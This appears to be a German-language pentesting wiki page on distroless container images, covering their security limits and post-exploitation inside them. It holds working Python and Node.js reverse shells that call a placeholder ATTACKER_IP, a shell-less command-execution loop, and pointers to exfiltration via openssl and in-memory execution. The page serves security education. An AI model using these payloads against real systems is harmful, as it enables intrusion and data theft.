# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Ein **distroless** Container-Image ist ein Image, das die **minimalen Laufzeitkomponenten enthält, die benötigt werden, um genau eine bestimmte Anwendung auszuführen**, und dabei bewusst die üblichen Distributionstools wie Paketmanager, Shells und große Mengen allgemeiner Userland-Utilities entfernt. In der Praxis enthalten distroless-Images oft nur die Anwendungs-Binärdatei oder Runtime, ihre Shared Libraries, Zertifikat-Bundles und ein sehr kleines Dateisystem-Layout.

Dabei geht es nicht darum, dass distroless ein neues Kernel-Isolationsprimitive ist. Distroless ist eine **Image-Design-Strategie**. Sie ändert, was im Container-Dateisystem verfügbar ist, nicht wie der Kernel den Container isoliert. Diese Unterscheidung ist wichtig, denn distroless härtet die Umgebung hauptsächlich dadurch, dass es reduziert, was ein Angreifer nach Erlangung von Codeausführung verwenden kann. Es ersetzt nicht namespaces, seccomp, capabilities, AppArmor, SELinux oder irgendeinen anderen Laufzeit-Isolationsmechanismus.

## Warum Distroless existiert

Distroless-Images werden hauptsächlich verwendet, um zu reduzieren:

- die Image-Größe
- die operative Komplexität des Images
- die Anzahl der Pakete und Binaries, die Schwachstellen enthalten könnten
- die Anzahl der Post-Exploitation-Tools, die einem Angreifer standardmäßig zur Verfügung stehen

Deshalb sind distroless-Images in Produktionsanwendungs-Deployments beliebt. Ein Container, der keine Shell, keinen Paketmanager und fast kein generisches Tooling enthält, ist operativ in der Regel leichter zu überblicken und nach einem Kompromiss schwerer interaktiv zu missbrauchen.

Beispiele bekannter distroless-artiger Image-Familien sind:

- Google's distroless images
- Chainguard hardened/minimal images

## Was Distroless nicht bedeutet

Ein distroless-Container ist **nicht**:

- automatisch rootless
- automatisch non-privileged
- automatisch read-only
- automatisch durch seccomp, AppArmor oder SELinux geschützt
- automatisch sicher vor container escape

Es ist weiterhin möglich, ein distroless-Image mit `--privileged`, Host-Namespace-Sharing, gefährlichen bind mounts oder einem gemounteten runtime-socket zu starten. In diesem Szenario mag das Image minimal sein, aber der Container kann trotzdem katastrophal unsicher sein. Distroless verändert die **Userland-Angriffsfläche**, nicht die **Kernel-Trust-Grenze**.

## Typische Betriebsmerkmale

Wenn Sie einen distroless-Container kompromittieren, fällt als Erstes oft auf, dass gängige Annahmen nicht mehr gelten. Es kann keine `sh`, kein `bash`, kein `ls`, kein `id`, kein `cat` geben, und manchmal nicht einmal eine libc-basierte Umgebung, die sich so verhält, wie Ihre übliche Tradecraft es erwartet. Das betrifft sowohl Offensive als auch Defensive, weil das Fehlen von Tools Debugging, Incident Response und Post-Exploitation verändert.

Die häufigsten Muster sind:

- die Anwendungs-Runtime ist vorhanden, aber sonst kaum etwas
- shell-basierte Payloads schlagen fehl, weil keine Shell vorhanden ist
- gängige Enumeration-One-Liner schlagen fehl, weil die Hilfs-Binaries fehlen
- Dateisystemschutzmechanismen wie read-only rootfs oder `noexec` auf beschreibbaren tmpfs-Standorten sind oft ebenfalls vorhanden

Diese Kombination führt in der Regel dazu, dass Leute über "weaponizing distroless" sprechen.

## Distroless und Post-Exploitation

Die größte offensive Herausforderung in einer distroless-Umgebung ist nicht immer das initiale RCE. Häufig ist es das, was danach kommt. Wenn der ausgenutzte Workload Codeausführung in einer Language-Runtime wie Python, Node.js, Java oder Go gewährt, können Sie möglicherweise beliebige Logik ausführen, aber nicht über die üblichen shell-zentrierten Workflows, die bei anderen Linux-Zielen verbreitet sind.

Das bedeutet, dass sich Post-Exploitation häufig in eine von drei Richtungen verschiebt:

1. **Die vorhandene Laufzeit direkt nutzen** um die Umgebung zu erkunden, Sockets zu öffnen, Dateien zu lesen oder zusätzliche Payloads zu stagen.
2. **Eigene Tools in den Speicher laden**, falls das Dateisystem read-only ist oder beschreibbare Orte mit `noexec` gemountet sind.
3. **Vorhandene Binaries im Image ausnutzen**, falls die Anwendung oder ihre Abhängigkeiten etwas unerwartet Nützliches enthalten.

## Missbrauch

### Die vorhandene Runtime auswerten

In vielen distroless-Containern gibt es keine Shell, aber es ist trotzdem eine Anwendungs-Runtime vorhanden. Wenn das Ziel ein Python-Service ist, ist Python vorhanden. Wenn das Ziel Node.js ist, ist Node vorhanden. Das bietet oft genug Funktionalität, um Dateien zu enumerieren, Umgebungsvariablen zu lesen, Reverse-Shells zu öffnen und in-Memory-Ausführung zu stagen, ohne jemals `/bin/sh` aufzurufen.

Ein einfaches Beispiel mit Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ein einfaches Beispiel mit Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Auswirkungen:

- Wiederherstellung von Umgebungsvariablen, häufig einschließlich Zugangsdaten oder Service-Endpunkten
- Dateisystem-Enumeration ohne `/bin/ls`
- Identifikation von beschreibbaren Pfaden und gemounteten secrets

### Reverse Shell ohne `/bin/sh`

Wenn das Image `sh` oder `bash` nicht enthält, kann eine klassische, shell-basierte reverse shell sofort fehlschlagen. In diesem Fall verwende stattdessen die installierte Sprachruntime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Wenn `/bin/sh` nicht existiert, ersetze die letzte Zeile durch direkte, von Python gesteuerte Befehlsausführung oder eine Python-REPL-Schleife.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Nochmals: Wenn `/bin/sh` fehlt, verwende direkt Node's filesystem-, process- und networking-APIs, anstatt eine Shell zu starten.

### Vollständiges Beispiel: Python-Befehls-Schleife ohne Shell

Wenn das Image Python hat, aber überhaupt keine Shell, reicht oft eine einfache interaktive Schleife aus, um die volle post-exploitation capability aufrechtzuerhalten:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Dafür wird keine interaktive Shell-Binärdatei benötigt. Aus Sicht eines Angreifers ist die Auswirkung faktisch dieselbe wie bei einer einfachen Shell: Befehlsausführung, Enumeration und das Staging weiterer Payloads über die vorhandene Laufzeitumgebung.

### In-Memory Tool Execution

Distroless-Images werden häufig kombiniert mit:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- dem Fehlen von Paketverwaltungstools

Diese Kombination macht klassische Workflows wie „Download der Binärdatei auf die Festplatte und Ausführung“ unzuverlässig. In solchen Fällen werden Techniken zur Ausführung im Speicher zur wichtigsten Lösung.

Die dafür vorgesehene Seite ist:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die relevantesten Techniken dort sind:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Einige distroless-Images enthalten weiterhin betrieblich notwendige Binaries, die nach einer Kompromittierung nützlich werden. Ein wiederholt beobachtetes Beispiel ist `openssl`, da Anwendungen es manchmal für Crypto- oder TLS-bezogene Aufgaben benötigen.

Ein schnelles Suchmuster ist:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Wenn `openssl` vorhanden ist, kann es verwendet werden für:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

Der genaue Missbrauch hängt davon ab, was tatsächlich installiert ist, aber die Grundidee ist, dass distroless nicht "no tools whatsoever" bedeutet; es bedeutet "far fewer tools than a normal distribution image".

## Prüfungen

Ziel dieser Checks ist es festzustellen, ob das Image in der Praxis wirklich distroless ist und welche runtime- oder helper binaries noch für post-exploitation verfügbar sind.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Was hier interessant ist:

- Wenn keine Shell vorhanden ist, aber eine Laufzeitumgebung wie Python oder Node vorhanden ist, sollte sich post-exploitation auf runtime-driven execution verlagern.
- Wenn das Root-Dateisystem schreibgeschützt ist und `/dev/shm` beschreibbar, aber `noexec`, werden memory execution techniques deutlich relevanter.
- Wenn Hilfs-Binaries wie `openssl`, `busybox` oder `java` vorhanden sind, können sie ausreichend Funktionalität bieten, um weiteren Zugriff zu bootstrapen.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Bewusst minimales Userland | Keine Shell, kein Paketmanager, nur Anwendungs-/Runtime-Abhängigkeiten | Hinzufügen von Debugging-Layern, Sidecar-Shells, Einfügen von busybox oder Tools |
| Chainguard minimal images | Bewusst minimales Userland | Reduzierte Paketoberfläche, oft auf eine Runtime oder einen Dienst fokussiert | Verwendung von `:latest-dev` oder Debug-Varianten, Kopieren von Tools während des Builds |
| Kubernetes workloads using distroless images | Hängt von der Pod-Konfiguration ab | Distroless betrifft nur das Userland; die Sicherheitslage des Pods hängt weiterhin von der Pod-Spezifikation und den Runtime-Defaults ab | Hinzufügen flüchtiger Debug-Container, Host-Mounts, privilegierte Pod-Einstellungen |
| Docker / Podman running distroless images | Hängt von Run-Flags ab | Minimales Dateisystem, aber die Runtime-Sicherheit hängt weiterhin von Flags und der Daemon-Konfiguration ab | `--privileged`, Teilen von Host-Namespaces, Runtime-Socket-Mounts, beschreibbare Host-Binds |

Der zentrale Punkt ist, dass distroless eine **Image-Eigenschaft** ist, keine Laufzeitschutzmaßnahme. Sein Wert liegt darin, zu reduzieren, was nach einer Kompromittierung im Dateisystem verfügbar ist.

## Related Pages

Für filesystem- und memory-execution bypasses, die in distroless-Umgebungen häufig benötigt werden:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Für container runtime, socket und mount abuse, die weiterhin auf distroless-Workloads zutrifft:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
